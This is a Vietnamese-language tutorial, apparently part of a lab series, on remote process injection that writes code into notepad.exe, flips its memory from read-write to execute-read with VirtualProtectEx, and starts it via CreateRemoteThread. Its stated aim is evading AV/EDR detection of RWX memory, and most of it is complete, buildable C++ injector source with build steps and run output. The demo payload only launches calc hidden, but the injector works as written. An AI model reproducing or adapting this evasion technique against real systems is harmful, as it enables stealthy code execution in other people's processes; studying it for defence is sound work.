
---

# 📝 [PE 04] Classic Code Injection — VirtualProtect

## 📌 1. Tổng Quan Kỹ Thuật (Overview)

**Classic Code Injection kết hợp VirtualProtect** là kỹ thuật nâng cấp thuộc nhóm **Né tránh phòng thủ động (Dynamic Evasion / Memory Anti-Forensics)**.

Hầu hết các giải pháp EDR hiện đại đều đặt bẫy Hook trinh sát rất nặng vào hai hàm `VirtualAlloc` và `VirtualAllocEx`. Nếu một tiến trình yêu cầu cấp phát một vùng nhớ mang sẵn thuộc tính **`PAGE_EXECUTE_READWRITE` (RWX)**, bộ quét hành vi sẽ lập tức đánh dấu đây là "Red Flag" chí mạng.

Kỹ thuật PE 04 hóa giải rào cản này bằng cách tách biệt chu kỳ sống của trang nhớ: Ban đầu chỉ xin quyền **`PAGE_READWRITE` (RW)** hoàn toàn hợp pháp để nạp dữ liệu, sau đó mới dùng hàm **`VirtualProtectEx`** để lật quyền sang **`PAGE_EXECUTE_READ` (RX)** ngay trước khi kích nổ luồng CPU.

### 🎯 Mục tiêu nghiên cứu:

* Vô hiệu hóa cơ chế phát hiện thuộc tính trang nhớ RWX mập mờ của AV/EDR.
* Làm chủ kỹ thuật điều khiển cờ bảo vệ bộ nhớ ảo (Memory Protection Constants) tại runtime.

---

## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)

Hệ điều hành Windows quản lý quyền hạn của từng trang bộ nhớ ảo thông qua cấu trúc Bảng trang (Page Tables) của CPU. Việc khai báo cờ quyền hạn diễn ra theo mô hình tịnh tiến an toàn sau:

```
[VirtualAllocEx: Cấp phát RW] ──> [WriteProcessMemory] ──> [VirtualProtectEx: Lật cờ sang RX] ──> [CreateRemoteThread]

```

1. **Ngụy trang phân vùng dữ liệu (`VirtualAllocEx`)**: Loader gửi yêu cầu xuống Kernel xin cấp phát một vùng nhớ mang cờ `PAGE_READWRITE` (Quyền Đọc/Ghi dữ liệu thông thường). Đối với hệ thống phòng thủ, đây là hành vi sinh hoạt bình thường của mọi ứng dụng (như khởi tạo biến, nạp buffer văn bản) nên sẽ chủ động bỏ qua, không kích hoạt cảnh báo hành vi.
2. **Đổ khuôn mã máy (`WriteProcessMemory`)**: Loader thực hiện ghi cấu trúc dữ liệu tuyệt đối và mã máy phẳng vào phân vùng `RW` vừa tạo. Tại thời điểm này, khối mã máy này hoàn toàn bất động và không thể thực thi (nếu CPU cố nhảy vào sẽ ăn lỗi sập tiến trình `DEP - Data Execution Prevention` lập tức).
3. **Mở khóa cờ thực thi (`VirtualProtectEx`)**: Ngay trước khi gọi luồng, Loader gửi lệnh yêu cầu Windows sửa đổi Bảng trang của tiến trình đích, lật cờ từ `PAGE_READWRITE` sang **`PAGE_EXECUTE_READ` (RX)**. Lúc này phân vùng chính thức biến thành một module mã máy hợp pháp, phẳng sạch kịch trần.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng thiết kế **Zero Static Buffers** (Cấp phát động thích ứng) và bóc tách cấu trúc dữ liệu tuyệt đối toán học để triệt tiêu lỗi RIP-Relative.

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _PROTECT_THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} PROTECT_THREAD_DATA, *PPROTECT_THREAD_DATA;

// Hàm chức năng độc lập vị trí (PIC) gánh luồng chạy chéo tiến trình
DWORD WINAPI RemoteProtectPayload(LPVOID lpParam) {
    PPROTECT_THREAD_DATA pData = (PPROTECT_THREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID linh hoạt, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetTargetProcessPID(const std::wstring& procName) {
    DWORD pid = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                if (_wcsicmp(procName.c_str(), pe32.szExeFile) == 0) { pid = pe32.th32ProcessID; break; }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 04: REMOTE INJECTION - VIRTUALPROTECT RX" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcessName = L"notepad.exe";
    DWORD dwPID = GetTargetProcessPID(targetProcessName);
    if (dwPID == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad nhen." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << dwPID << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed!" << std::endl;
        return EXIT_FAILURE;
    }

    SIZE_T functionSize = 500;

    // BƯỚC 1: Né tránh bộ lọc - Chỉ cấp phát vùng nhớ mang quyền ĐỌC/GHI (PAGE_READWRITE)
    std::cout << "[*] Dang ngu trang cap phat phan vung mang quyen RW..." << std::endl;
    LPVOID remoteCodeBuffer = VirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    LPVOID remoteDataBuffer = VirtualAllocEx(hProcess, NULL, sizeof(PROTECT_THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteCodeBuffer || !remoteDataBuffer) {
        std::cerr << "[-] VirtualAllocEx failed!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Trang nho Code khoi tao voi quyen RW tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Khởi tạo bảng dữ liệu tham số tuyệt đối cục bộ
    PROTECT_THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // BƯỚC 2: Ghi dữ liệu Payload lên phân vùng RW bình thường
    WriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemoteProtectPayload, functionSize, NULL);
    WriteProcessMemory(hProcess, remoteDataBuffer, &localData, sizeof(PROTECT_THREAD_DATA), NULL);
    std::cout << "[+] Na nạp ma may va tham so sang phân vung RW hoan tat." << std::endl;

    // BƯỚC 3: CHIẾN THUẬT LẬT CỜ - Chuyển đổi thuộc tính trang nhớ sang PAGE_EXECUTE_READ (RX)
    std::cout << "[*] Dang kich hoat VirtualProtectEx de mo khoa quyen thuc thi RX..." << std::endl;
    DWORD oldProtect = 0;
    BOOL isProtected = VirtualProtectEx(hProcess, remoteCodeBuffer, functionSize, PAGE_EXECUTE_READ, &oldProtect);
    
    if (!isProtected) {
        std::cerr << "[-] VirtualProtectEx that bai! Luong bao ve cua OS ngan chan." << std::endl;
        VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, remoteDataBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Mo khoa trang nho sang quyen RX thanh cong! (Cờ bao ve cu: 0x" << std::hex << oldProtect << ")" << std::endl;

    // BƯỚC 4: Kích nổ luồng thực thi an toàn thông qua phân vùng RX phẳng sạch
    std::cout << "[*] Dang thuc hien khoi tao luong tu xa..." << std::endl;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, remoteDataBuffer, 0, NULL);
    
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE); // Gánh luồng xử lý dứt điểm phẳng sạch
        std::cout << "[+] VirtualProtect Code Injection Successful!" << std::endl;
        CloseHandle(hThread);
    } else {
        std::cerr << "[-] CreateRemoteThread failed! Error: " << GetLastError() << std::endl;
    }

    // Thu hồi tài nguyên Handle triệt để chống Memory Leak
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)

Để tệp nhị phân vận hành độc lập, bỏ qua hoàn toàn sự phụ thuộc vào các thư viện DLL động của môi trường phát triển:

### ⚙️ Thiết lập trên Microsoft Visual Studio:

1. Đặt cấu hình quản lý dự án chính xác ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
2. Đi tới mục cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng `Runtime Library`, thiết lập cờ **`Multi-threaded (/MT)`** để liên kết tĩnh thư viện hệ thống chạy mượt mà trên môi trường máy ảo VM sạch.
3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân sạch bóng.

---

## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)

Bật sẵn một ứng dụng `Notepad.exe` trên máy Lab, mở PowerShell ngoài đĩa thô và chạy file thực thi:

```powershell
PS C:\Workspace\x64\Release> .\PE04_VirtualProtect_Injection.exe
====================================================
[*] PE 04: REMOTE INJECTION - VIRTUALPROTECT RX
====================================================
[+] Da tim thay Notepad.exe voi PID: 18240
[*] Dang ngu trang cap phat phan vung mang quyen RW...
[+] Trang nho Code khoi tao voi quyen RW tai: 0x0000021F83A20000
[+] Na nạp ma may va tham so sang phân vung RW hoan tat.
[*] Dang kich hoat VirtualProtectEx de mo khoa quyen thuc thi RX...
[+] Mo khoa trang nho sang quyen RX thanh cong! (Cờ bao ve cu: 0x4)
[*] Dang thuc hien khoi tao luong tu xa...
[+] VirtualProtect Code Injection Successful!

[*] Hoan thanh quy trinh. Nhan Enter de dong cua so...

```

*🎯 Hệ quả RAM:* Ứng dụng Máy tính `calc.exe` bật bung lên hiên ngang tại runtime, hóa giải hoàn toàn cơ chế trinh sát cờ RWX mập mờ kịch trần kịch khung!

---

